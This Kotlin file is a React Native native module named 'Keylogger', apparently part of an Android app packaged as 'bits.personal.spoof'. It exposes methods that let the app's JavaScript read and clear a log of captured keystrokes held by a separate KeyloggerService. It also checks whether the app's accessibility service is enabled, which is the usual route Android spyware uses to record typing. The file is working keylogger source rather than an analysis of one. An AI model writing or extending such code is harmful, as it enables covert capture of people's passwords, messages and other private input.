package bits.personal.spoof.keylogger

import com.facebook.react.bridge.ReactApplicationContext
import com.facebook.react.bridge.ReactContextBaseJavaModule
import com.facebook.react.bridge.ReactMethod
import com.facebook.react.bridge.Promise
import org.json.JSONArray
import org.json.JSONObject

/**
 * KeyloggerModule — React Native Native Module
 *
 * Exposes two methods to JavaScript:
 *   NativeModules.Keylogger.readLog()   → resolves with JSON string of log entries
 *   NativeModules.Keylogger.clearLog()  → clears stored log
 *   NativeModules.Keylogger.isAccessibilityEnabled() → resolves with boolean
 */
class KeyloggerModule(reactContext: ReactApplicationContext)
    : ReactContextBaseJavaModule(reactContext) {

    override fun getName(): String = "Keylogger"

    @ReactMethod
    fun readLog(promise: Promise) {
        try {
            val arr: JSONArray = KeyloggerService.readLog(reactApplicationContext)
            promise.resolve(arr.toString())
        } catch (e: Exception) {
            promise.reject("READ_ERROR", e.message, e)
        }
    }

    @ReactMethod
    fun clearLog(promise: Promise) {
        try {
            KeyloggerService.clearLog(reactApplicationContext)
            promise.resolve(true)
        } catch (e: Exception) {
            promise.reject("CLEAR_ERROR", e.message, e)
        }
    }

    @ReactMethod
    fun isAccessibilityEnabled(promise: Promise) {
        try {
            val am = reactApplicationContext.getSystemService(
                android.content.Context.ACCESSIBILITY_SERVICE
            ) as android.view.accessibility.AccessibilityManager
            val enabledServices = android.provider.Settings.Secure.getString(
                reactApplicationContext.contentResolver,
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: ""
            val enabled = enabledServices.contains("bits.personal.spoof")
            promise.resolve(enabled)
        } catch (e: Exception) {
            promise.resolve(false)
        }
    }
}
